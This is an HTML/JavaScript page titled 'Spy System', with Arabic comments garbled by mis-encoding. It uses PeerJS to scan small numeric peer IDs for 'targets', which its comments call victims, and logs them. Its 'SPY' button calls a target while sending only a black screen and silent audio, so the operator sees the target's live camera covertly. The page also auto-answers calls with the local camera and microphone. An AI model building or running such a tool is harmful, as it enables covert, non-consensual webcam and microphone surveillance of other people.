<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Control | Spy System</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
        body { background: #000; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        #loginScreen { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .card { border: 1px solid #0f0; padding: 20px; width: 90%; max-width: 400px; box-shadow: 0 0 15px #0f0; background: #050505; }
        
        .my-id { font-size: 3rem; font-weight: bold; margin: 20px 0; color: white; text-shadow: 0 0 10px #0f0; }
        
        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #0f0; color: white; text-align: center; font-size: 1.2rem; }
        
        button { width: 100%; padding: 15px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 5px; }
        button:hover { background: #0f0; color: black; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­ÙƒÙ… */
        #mainInterface { display: none; height: 100%; flex-direction: column; }
        
        .top-bar { padding: 10px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; align-items: center; background: #001100; }
        
        .video-area { flex: 1; position: relative; display: flex; border-bottom: 2px solid #0f0; }
        .vid { flex: 1; border-right: 1px solid #0f0; position: relative; background: #111; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label { position: absolute; bottom: 5px; left: 5px; background: black; padding: 2px 5px; font-size: 0.8rem; }

        /* Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…ØªØµÙ„ÙŠÙ† (Admin Panel) */
        .admin-panel { height: 30%; background: #050505; padding: 10px; overflow-y: auto; border-top: 2px solid #0f0; }
        .user-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px dashed #333; align-items: center; }
        .user-id { font-size: 1.2rem; font-weight: bold; }
        
        .btn-spy { background: #300; color: red; border-color: red; padding: 5px 10px; font-size: 0.8rem; width: auto; }
        .btn-spy:hover { background: red; color: white; }

        /* Ø²Ø± Ø§Ù„Ø£Ø¯Ù…Ù† */
        #adminToggle { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; z-index: 999; opacity: 0; }
    </style>
</head>
<body>

    <!-- 1. Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -->
    <div id="loginScreen">
        <div class="card">
            <h1>ğŸ“¡ NETWORK LOGIN</h1>
            <p style="color:#777">MY ID:</p>
            <div class="my-id" id="myIdDisplay">--</div>
            
            <input type="number" id="targetId" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¶Ø­ÙŠØ© (Ø£Ø¯Ø®Ù„ ÙŠØ¯ÙˆÙŠØ§Ù‹)">
            <button onclick="connectManual()">Ø§ØªØµØ§Ù„ Ù…Ø¨Ø§Ø´Ø± (Connect)</button>
            <button onclick="autoScan()" style="background:#004444; color:#0ff; border-color:#0ff;">ğŸ” Ø¨Ø­Ø« ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø³Ø±ÙŠØ¹</button>
        </div>
    </div>

    <!-- 2. ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù†Ø¸Ø§Ù… -->
    <div id="mainInterface">
        <div class="top-bar">
            <span>ğŸ”´ LIVE FEED</span>
            <button onclick="location.reload()" style="width:auto; padding:5px 10px; background:red; color:white; border:none;">EXIT</button>
        </div>

        <div class="video-area">
            <div class="vid">
                <video id="localVideo" autoplay muted></video>
                <div class="label">ME (Admin)</div>
            </div>
            <div class="vid">
                <video id="remoteVideo" autoplay></video>
                <div class="label">TARGET</div>
            </div>
        </div>

        <!-- Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…ØªØµÙ„ÙŠÙ† (ØªØ¸Ù‡Ø± Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„Ù„Ø£Ø¯Ù…Ù†) -->
        <div class="admin-panel" id="adminPanel">
            <h3 style="border-bottom:1px solid #0f0; margin-bottom:10px;">ğŸ“‹ DETECTED TARGETS</h3>
            <div id="usersList">
                <div style="color:#555; text-align:center; padding:10px;">No targets detected yet...</div>
            </div>
        </div>
    </div>

    <script>
        // === 1. ØªØ­Ø¯ÙŠØ¯ Ø±Ù‚Ù… ØµØºÙŠØ± Ø¬Ø¯Ø§Ù‹ (10-99) Ù„ØªØ³Ù‡ÙŠÙ„ Ø§Ù„Ø¹Ø«ÙˆØ± ===
        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
        document.getElementById('myIdDisplay').innerText = myId;

        let peer = new Peer(myId);
        let conn = null;
        let call = null;
        let localStream = null;
        
        // Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…ØªØµÙ„ÙŠÙ† Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©
        let detectedHistory = JSON.parse(localStorage.getItem('targets') || "[]");

        // === ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹ ===
        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
            localStream = stream;
            document.getElementById('localVideo').srcObject = stream;
        });

        // === Ø£Ø­Ø¯Ø§Ø« PEERJS ===
        peer.on('open', id => console.log('My ID:', id));

        // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§ØªØµØ§Ù„
        peer.on('connection', c => {
            conn = c;
            saveUser(conn.peer); // Ø­ÙØ¸ Ø§Ù„Ø¶Ø­ÙŠØ© ÙÙˆØ±Ø§Ù‹
            setupConnection();
        });

        // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ
        peer.on('call', incomingCall => {
            incomingCall.answer(localStream);
            call = incomingCall;
            call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
            saveUser(incomingCall.peer); // Ø­ÙØ¸ Ø§Ù„Ø¶Ø­ÙŠØ©
            enterSystem();
        });

        peer.on('error', err => {
            console.log("Error:", err.type);
            // Ø¥Ø°Ø§ ÙØ´Ù„ Ø§Ù„Ø¨Ø­Ø« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØŒ Ø¬Ø±Ø¨ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ§Ù„ÙŠ
            if(window.isScanning) scanNext();
        });

        // === Ø§Ù„ÙˆØ¸Ø§Ø¦Ù ===

        function connectManual() {
            let id = document.getElementById('targetId').value;
            if(!id) return alert("Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¶Ø­ÙŠØ©");
            initiateCall(id);
        }

        // Ø§Ù„Ø¨Ø­Ø« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ (Ø§Ù„Ø±Ø§Ø¯Ø§Ø±)
        window.scanIndex = 10;
        window.isScanning = false;

        function autoScan() {
            window.isScanning = true;
            document.querySelector('button[onclick="autoScan()"]').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­... (Ø§Ù†ØªØ¸Ø±)";
            scanNext();
        }

        function scanNext() {
            if(!window.isScanning) return;
            if(window.scanIndex > 99) window.scanIndex = 10; // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ¯ÙˆÙŠØ±
            
            let target = window.scanIndex.toString();
            if(target === myId) { window.scanIndex++; return scanNext(); }

            console.log("Scanning ID:", target);
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø®ÙÙŠÙ Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙˆØ¬ÙˆØ¯
            let testConn = peer.connect(target);
            
            let found = false;
            
            testConn.on('open', () => {
                found = true;
                window.isScanning = false;
                saveUser(target);
                initiateCall(target); // ÙˆØ¬Ø¯Ù†Ø§ Ø´Ø®Øµ! Ø§ØªØµÙ„ Ø¨Ù‡
            });

            // Ù†Ù†ØªØ¸Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø«Ù… Ù†Ø¬Ø±Ø¨ Ø§Ù„ØªØ§Ù„ÙŠ Ø¥Ø°Ø§ Ù„Ù… ÙŠØ±Ø¯
            setTimeout(() => {
                if(!found) {
                    testConn.close();
                    window.scanIndex++;
                    scanNext();
                }
            }, 200); // Ø³Ø±Ø¹Ø© Ø§Ù„Ù…Ø³Ø­ (200ms Ù„ÙƒÙ„ Ø±Ù‚Ù…)
        }

        function initiateCall(id) {
            conn = peer.connect(id);
            conn.on('open', () => {
                setupConnection();
                call = peer.call(id, localStream);
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                enterSystem();
            });
        }

        function setupConnection() {
            conn.on('data', data => console.log("Data:", data));
            conn.on('close', () => alert("Ø§Ù†Ù‚Ø·Ø¹ Ø§Ù„Ø§ØªØµØ§Ù„"));
        }

        function enterSystem() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('mainInterface').style.display = 'flex';
            renderUsers();
        }

        // === Ù†Ø¸Ø§Ù… Ø­ÙØ¸ Ø§Ù„Ø¶Ø­Ø§ÙŠØ§ (Admin List) ===
        function saveUser(id) {
            if(!detectedHistory.includes(id)) {
                detectedHistory.push(id);
                localStorage.setItem('targets', JSON.stringify(detectedHistory));
                renderUsers();
            }
        }

        function renderUsers() {
            let container = document.getElementById('usersList');
            if(detectedHistory.length === 0) return;
            
            container.innerHTML = '';
            detectedHistory.forEach(id => {
                let row = `
                    <div class="user-row">
                        <span class="user-id">TARGET #${id}</span>
                        <div>
                            <button class="btn-spy" onclick="spyAction('${id}')">ğŸ‘ï¸ SPY</button>
                            <button class="btn-spy" style="background:#003300; border-color:#0f0; color:#0f0" onclick="initiateCall('${id}')">ğŸ“ CALL</button>
                        </div>
                    </div>
                `;
                container.innerHTML += row;
            });
        }

        // === Ù…ÙŠØ²Ø© Ø§Ù„ØªØ¬Ø³Ø³ (Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡) ===
        function spyAction(id) {
            // Ø¥Ù†Ø´Ø§Ø¡ Ø´Ø§Ø´Ø© Ø³ÙˆØ¯Ø§Ø¡
            let canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = "black"; ctx.fillRect(0,0,100,100);
            let blackStream = canvas.captureStream(25);
            
            // Ø¥Ø¶Ø§ÙØ© ØµÙˆØª ØµØ§Ù…Øª
            let audioCtx = new AudioContext();
            let dest = audioCtx.createMediaStreamDestination();
            blackStream.addTrack(dest.stream.getAudioTracks()[0]);

            call = peer.call(id, blackStream);
            call.on('stream', rs => {
                document.getElementById('remoteVideo').srcObject = rs; // Ù†Ø±Ù‰ Ø§Ù„Ø¶Ø­ÙŠØ©
                document.getElementById('localVideo').srcObject = blackStream; // Ù†Ø±Ù‰ Ø´Ø§Ø´ØªÙ†Ø§ Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡
                enterSystem();
            });
        }

        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø¨Ø¯Ø¡
        renderUsers();

    </script>
</body>
</html>
